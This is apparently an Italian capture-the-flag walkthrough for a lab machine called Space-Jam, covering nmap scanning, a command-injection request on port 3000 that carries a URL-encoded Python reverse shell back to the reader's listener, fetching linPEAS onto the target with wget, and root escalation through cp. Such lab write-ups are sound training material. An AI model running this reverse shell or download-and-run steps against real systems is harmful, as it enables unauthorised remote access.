#Space-Jam
### ENUM
partiamo con uno scan della macchina

```bash
nmap Spacejam.thm -sV -sC 
```

troviamo cosi la porta 3000 aperta(se non la trovate lanciate questo comando
```bash
nmap Spacejam.thm -sV -p-
```
mettiamoci in ascolto su una porta aperta da noi
```bash
nc -lvnp 4444
```

mandiamo una richiesta alla porta 3000 con una reverse shell
```bash
curl "Spacejam.thm:3000/?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<ilvostroip>%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"
```

ecco la nostra shell sul primo terminale
## privesc
mettiamo linPEAS sulla macchina (scaricatevelo prima!!)

apriamo un server http sulla nostra macchina dove è contenuto linPEAS
```bash
python -m http.server 80
```

facciamo una richiesta sulla shell ottenuta prima tramite questo comando
```bash
wget http://ipvostro/linPEAS.sh
```

diamogli i giusti permessi
```bash
chmod +x linPEAS.sh
./linPEAS.sh
```

ecco la nostra vulnerabilità sul comando cp usiamo GTFO.BINS per capire che comando eseguire e siamo root

